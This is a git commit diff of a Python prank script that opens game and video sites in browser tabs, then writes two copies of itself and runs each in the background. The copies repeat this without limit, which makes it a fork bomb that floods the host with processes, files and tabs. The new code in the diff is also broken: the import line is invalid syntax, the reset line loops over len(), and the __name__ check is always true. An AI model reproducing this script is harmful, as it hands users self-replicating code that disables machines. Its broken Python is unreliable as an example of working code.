de1f5a37ea522b7c676a1bc5a7990b98fa158584
amadeusine <sclg9w@mail.umkc.edu>
2019-03-15 12:22:20 -0500

    Tidied conventions and added comprehensions

--- har.py
+++ har.py
@@ -1,5 +1,5 @@
 import webbrowser as wb
-import os
+import path, system from os
 import time
 
 wbarray = [
@@ -8,42 +8,51 @@ wbarray = [
     'https://www.youtube.com/watch?v=Y9wXfdjDzrA'
 ]
 
-def run_links():
+
+config = {
+    'char_limit': 250,
+    'har': 'har'
+}
+
+def open_links():
     wb.open_new('https://www.minecraft.net/download')
     for link in wbarray:
        wb.open_new_tab(link)
 
-def getnewfilename(filename):
-    num = ''
-    for char in filename[::-1]:
-        if char in '1234567890':
-            num = char + num
-    num1 = (int(num) * 2) if len(num) > 0 else num
-    num2 = (int(num) * 2) + 1 if len(num) > 0 else num
-    num1, num2 = str(num1), str(num2)
-    fname0 = 'har' + ('1' if num1 == '' else num1)
-    fname1 = 'har' + ('2' if num2 == '' else num2)
-    return [fname0, fname1]
+def fork(filename, ):
+    num = ''.join(char for char in filename[::-1] if char in '1234567890')
+
+    num1 = str(int(num) * 2) if len(num) else num
+    num2 = str(int(num) * 2 + 1) if len(num) else num
+
+    fnames = [
+        'har' + (num1 if num1 else '1'),
+        'har' + (num2 if num2 else '2')
+    ]
+    return fnames
 
 def everything():
     print("Hello, Dave.")
-    run_links()
+    open_links()
     
-    filename, fileext = os.path.splitext(os.path.basename(__file__))
-    directory = os.path.dirname(os.path.abspath(__file__))
+    filename, ext = path.splitext(path.basename(__file__))
+    directory = path.dirname(path.abspath(__file__))
     
-    fnames = getnewfilename(filename)
+    children = fork(filename)
 
-    if (len(fnames[0]) > 250 or len(fnames[1]) > 250):
+    overflow = sum(len(child) > config['char_limit'] for child in children)
+
+    if overflow:
         print('resetting')
-        fnames[0] = 'har1'
-        fnames[1] = 'har2'
+        fnames = [f'{config['har']}{i}' for i in len(fnames)]
 
-    with open(os.path.join(directory, filename+fileext)) as reader:
-        for fname in fnames:
-            with open(os.path.join(directory, fname+fileext), 'w+') as writer:
+    fin = path.join(directory, filename+ext)
+    with open(fin) as reader:
+        for child in children:
+            fout = path.join(directory, child+ext)
+            with open(fout, 'w+') as writer:
                 writer.write(reader.read())
-            os.system('python {}{} &'.format(os.path.join(directory, fname), fileext))
+            system(f'python {fout} &')
 
 if __name__ == __name__:
 	wb.open_new('https://www.roblox.com/')
